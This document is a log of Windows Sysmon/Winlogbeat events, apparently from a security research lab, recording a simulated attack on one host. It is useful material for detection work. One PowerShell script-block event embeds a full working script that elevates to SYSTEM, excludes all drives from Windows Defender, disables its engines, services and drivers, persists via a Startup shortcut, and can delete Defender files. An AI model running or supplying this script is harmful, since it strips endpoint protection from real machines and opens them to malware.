{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:57","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:57","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:58","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:58","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:58","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:58","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:58","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:58","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Engine Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:58","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:58","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:58","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:58","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"File created (rule: FileCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Special Logon","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Provider Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:34:59","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:34:59","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Engine Lifecycle","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:03","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:03","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:08","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:08","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:12","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:12","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":"System\\CurrentControlSet\\Control\\SecurityProviders\\SCHANNEL","winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:12","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:12","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Registry object added or deleted (rule: RegistryEvent)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"# Disable Windows Defender\n\n<#\nOptions :\n\n-Delete : delete the defender related files (services, drivers, executables, ....) \n\nSource :  https://bidouillesecurity.com/disable-windows-defender-in-powershell\n\n#>\n\nWrite-Host \"[+] Disable Windows Defender (as $(whoami))\"\n\n\n## STEP 0 : elevate if needed\n\n\nif(-Not $($(whoami) -eq \"nt authority\\system\")) {\n    $IsSystem = $false\n\n    # Elevate to admin (needed when called after reboot)\n    if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {\n        Write-Host \"    [i] Elevate to Administrator\"\n        $CommandLine = \"-ExecutionPolicy Bypass `\"\" + $MyInvocation.MyCommand.Path + \"`\" \" + $MyInvocation.UnboundArguments\n        Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine\n        Exit\n    }\n\n    # Elevate to SYSTEM if psexec is available\n    $psexec_path = $(Get-Command PsExec -ErrorAction 'ignore').Source \n    if($psexec_path) {\n        Write-Host \"    [i] Elevate to SYSTEM\"\n        $CommandLine = \" -i -s powershell.exe -ExecutionPolicy Bypass `\"\" + $MyInvocation.MyCommand.Path + \"`\" \" + $MyInvocation.UnboundArguments \n        Start-Process -WindowStyle Hidden -FilePath $psexec_path -ArgumentList $CommandLine\n        exit\n    } else {\n        Write-Host \"    [i] PsExec not found, will continue as Administrator\"\n    }\n\n} else {\n    $IsSystem = $true\n}\n\n\n## STEP 1 : Disable everything we can with immediate effect\n\n\nWrite-Host \"    [+] Add exclusions\"\n\n# Add the whole system in Defender exclusions\n\n67..90|foreach-object{\n    $drive = [char]$_\n    Add-MpPreference -ExclusionPath \"$($drive):\\\" -ErrorAction SilentlyContinue\n    Add-MpPreference -ExclusionProcess \"$($drive):\\*\" -ErrorAction SilentlyContinue\n}\n\nWrite-Host \"    [+] Disable scanning engines (Set-MpPreference)\"\n\nSet-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue\nSet-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue\n\nWrite-Host \"    [+] Set default actions to Allow (Set-MpPreference)\"\n\nSet-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue\nSet-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue\nSet-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue\n\n\n## STEP 2 : Disable services, we cannot stop them, but we can disable them (they won't start next reboot)\n\n\nWrite-Host \"    [+] Disable services\"\n\n$need_reboot = $false\n\n# WdNisSvc Network Inspection Service \n# WinDefend Antivirus Service\n# Sense : Advanced Protection Service\n\n$svc_list = @(\"WdNisSvc\", \"WinDefend\", \"Sense\")\nforeach($svc in $svc_list) {\n    if($(Test-Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svc\")) {\n        if( $(Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svc\").Start -eq 4) {\n            Write-Host \"        [i] Service $svc already disabled\"\n        } else {\n            Write-Host \"        [i] Disable service $svc (next reboot)\"\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svc\" -Name Start -Value 4\n            $need_reboot = $true\n        }\n    } else {\n        Write-Host \"        [i] Service $svc already deleted\"\n    }\n}\n\nWrite-Host \"    [+] Disable drivers\"\n\n# WdnisDrv : Network Inspection System Driver\n# wdfilter : Mini-Filter Driver\n# wdboot : Boot Driver\n\n$drv_list = @(\"WdnisDrv\", \"wdfilter\", \"wdboot\")\nforeach($drv in $drv_list) {\n    if($(Test-Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$drv\")) {\n        if( $(Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$drv\").Start -eq 4) {\n            Write-Host \"        [i] Driver $drv already disabled\"\n        } else {\n            Write-Host \"        [i] Disable driver $drv (next reboot)\"\n            Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$drv\" -Name Start -Value 4\n            $need_reboot = $true\n        }\n    } else {\n        Write-Host \"        [i] Driver $drv already deleted\"\n    }\n}\n\n# Check if service running or not\nif($(GET-Service -Name WinDefend).Status -eq \"Running\") {   \n    Write-Host \"    [+] WinDefend Service still running (reboot required)\"\n    $need_reboot = $true\n} else {\n    Write-Host \"    [+] WinDefend Service not running\"\n}\n\n\n## STEP 3 : Reboot if needed, add a link to the script to Startup (will be runned again after reboot)\n\n\n$link_reboot = \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\disable-defender.lnk\"\nRemove-Item -Force \"$link_reboot\" -ErrorAction 'ignore' # Remove the link (only execute once after reboot)\n\nif($need_reboot) {\n    Write-Host \"    [+] This script will be started again after reboot.\" -BackgroundColor DarkRed -ForegroundColor White\n    \n    $powershell_path = '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"'\n    $cmdargs = \"-ExecutionPolicy Bypass `\"\" + $MyInvocation.MyCommand.Path + \"`\" \" + $MyInvocation.UnboundArguments\n    \n    $res = New-Item $(Split-Path -Path $link_reboot -Parent) -ItemType Directory -Force\n    $WshShell = New-Object -comObject WScript.Shell\n    $shortcut = $WshShell.CreateShortcut($link_reboot)\n    $shortcut.TargetPath = $powershell_path\n    $shortcut.Arguments = $cmdargs\n    $shortcut.WorkingDirectory = \"$(Split-Path -Path $PSScriptRoot -Parent)\"\n    $shortcut.Save()\n\n} else {\n\n\n    ## STEP 4 : After reboot (we checked that everything was successfully disabled), make sure it doesn't come up again !\n\n\n    if($IsSystem) {\n\n        # Configure the Defender registry to disable it (and the TamperProtection)\n        # editing HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\ requires to be SYSTEM\n\n        Write-Host \"    [+] Disable all functionnalities with registry keys (SYSTEM privilege)\"\n\n        # Cloud-delivered protection:\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name SpyNetReporting -Value 0\n        # Automatic Sample submission\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name SubmitSamplesConsent -Value 0\n        # Tamper protection\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name TamperProtection -Value 4\n        \n        # Disable in registry\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n        Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n\n    } else {\n        Write-Host \"    [W] (Optional) Cannot configure registry (not SYSTEM)\"\n    }\n\n\n    if($MyInvocation.UnboundArguments -And $($MyInvocation.UnboundArguments.tolower().Contains(\"-delete\"))) {\n        \n        # Delete Defender files\n\n        function Delete-Show-Error {\n            $path_exists = Test-Path $args[0]\n            if($path_exists) {\n                Remove-Item -Recurse -Force -Path $args[0]\n            } else {\n                Write-Host \"    [i] $($args[0]) already deleted\"\n            }\n        }\n\n        Write-Host \"\"\n        Write-Host \"[+] Delete Windows Defender (files, services, drivers)\"\n\n        # Delete files\n        Delete-Show-Error \"C:\\ProgramData\\Windows\\Windows Defender\\\"\n        Delete-Show-Error \"C:\\ProgramData\\Windows\\Windows Defender Advanced Threat Protection\\\"\n\n        # Delete drivers\n        Delete-Show-Error \"C:\\Windows\\System32\\drivers\\wd\\\"\n\n        # Delete service registry entries\n        foreach($svc in $svc_list) {\n            Delete-Show-Error \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$svc\"\n        }\n\n        # Delete drivers registry entries\n        foreach($drv in $drv_list) {\n            Delete-Show-Error \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$drv\"\n        }\n    }\n}\n\nWrite-Host \"\"\nRead-Host -Prompt \"Press any key to continue\""}
{"timestamp":"2021-09-15T16:35:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:13","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\whoami.exe\"","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass \"\"  ","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\whoami.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:13","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\whoami.exe\"","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass \"\"  ","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\whoami.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:13","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:13","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Network connection detected (rule: NetworkConnect)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n\n$script:ClassName = 'ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpComputerStatus'\n$script:ClassVersion = ''\n$script:ModuleVersion = '1.0'\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\n\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\n\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\n        \n\nfunction __cmdletization_BindCommonParameters\n{\n    param(\n        $__cmdletization_objectModelWrapper,\n        $myPSBoundParameters\n    )       \n                \n\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \n        }\n                    \n\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \n        }\n                    \n\n}\n                \n\nfunction Get-MpComputerStatus\n{\n    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]\n    \n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]\n[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\\Microsoft\\Windows\\Defender\\MSFT_MpComputerStatus')]\n\n    param(\n    \n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [int]\n    ${ThrottleLimit},\n\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()\n\n\n    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpComputerStatus.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-MpComputerStatus' -Alias '*'\n        "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":"C:\\Windows\\system32\\devicecensus.exe UserCxt","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\system32\\devicecensus.exe","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\DeviceCensus.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"= $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('RealTimeScanDirection')) {\n          [object]$__cmdletization_value = ${RealTimeScanDirection}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RealTimeScanDirection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('QuarantinePurgeItemsAfterDelay')) {\n          [object]$__cmdletization_value = ${QuarantinePurgeItemsAfterDelay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'QuarantinePurgeItemsAfterDelay'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('RemediationScheduleDay')) {\n          [object]$__cmdletization_value = ${RemediationScheduleDay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemediationScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        